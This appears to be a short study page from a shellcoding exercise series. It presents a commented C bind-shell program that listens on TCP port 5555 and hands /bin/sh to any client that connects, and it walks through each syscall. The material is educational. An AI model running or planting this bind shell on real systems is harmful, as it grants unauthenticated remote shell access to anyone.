
Hello World, my name is Bobby.
+[Analyze msfvenom/linux/x86/exec](/5_MSF_Analyze/1_exec_nc)


```c
#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

    // This is our first syscall, the socket() call. 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // It looks like here we're building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(5555);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // Our third syscall is listen()
    listen(listen_sock, 0);

    // Our fourth syscall is accept() 
    int conn_sock = accept(listen_sock, NULL, NULL);

    // Our fifth syscall, dup2(), is used 3 times
    dup2(conn_sock, 0);
    dup2(conn_sock, 1);
    dup2(conn_sock, 2);

    // Our final syscall is execve(), which runs a program fed to it as a string
    execve("/bin/sh", NULL, NULL);
}
```
